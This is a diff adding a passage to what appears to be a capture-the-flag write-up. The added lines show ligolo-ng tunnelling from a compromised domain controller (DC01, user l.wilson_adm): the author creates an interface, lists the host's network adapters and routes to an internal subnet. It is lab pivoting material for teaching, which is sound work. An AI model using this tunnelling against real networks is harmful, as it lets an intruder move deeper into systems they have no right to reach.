@@ -397,6 +397,45 @@ time="2026-11-09T20:31:32-08:00" level=info msg="Connection established" addr="1
 Ill then connect the agent back to me
 
 ```python
+[Agent : GARFIELD\l.wilson_adm@DC01] » ifcreate --name ligolo
+INFO[0069] Creating a new ligolo interface...           
+INFO[0069] Interface created! 
+
+[Agent : GARFIELD\l.wilson_adm@DC01] » ifconfig
+┌───────────────────────────────────────────────┐
+│ Interface 0                                   │
+├──────────────┬────────────────────────────────┤
+│ Name         │ vEthernet (Switch01)           │
+│ Hardware MAC │ 00:15:5d:0b:dd:00              │
+│ MTU          │ 1500                           │
+│ Flags        │ up|broadcast|multicast|running │
+│ IPv6 Address │ fe80::c4ff:5747:1d3c:fba0/64   │
+│ IPv4 Address │ 192.168.100.1/24               │
+└──────────────┴────────────────────────────────┘
+┌──────────────────────────────────────────────────┐
+│ Interface 1                                      │
+├──────────────┬───────────────────────────────────┤
+│ Name         │ Ethernet0 3                       │
+│ Hardware MAC │ a2:de:ad:27:44:09                 │
+│ MTU          │ 1500                              │
+│ Flags        │ up|broadcast|multicast|running    │
+│ IPv6 Address │ dead:beef::3c92:9bfa:8884:4815/64 │
+│ IPv6 Address │ fe80::8917:8f47:750:28ba/64       │
+│ IPv4 Address │ 10.129.86.27/16                   │
+└──────────────┴───────────────────────────────────┘
+┌──────────────────────────────────────────────┐
+│ Interface 2                                  │
+├──────────────┬───────────────────────────────┤
+│ Name         │ Loopback Pseudo-Interface 1   │
+│ Hardware MAC │                               │
+│ MTU          │ -1                            │
+│ Flags        │ up|loopback|multicast|running │
+│ IPv6 Address │ ::1/128                       │
+│ IPv4 Address │ 127.0.0.1/8                   │
+└──────────────┴───────────────────────────────┘
+[Agent : GARFIELD\l.wilson_adm@DC01] » route_add --name ligolo --route 192.168.100.0/24
+INFO[0106] Route created.        
+
 
 ```
 
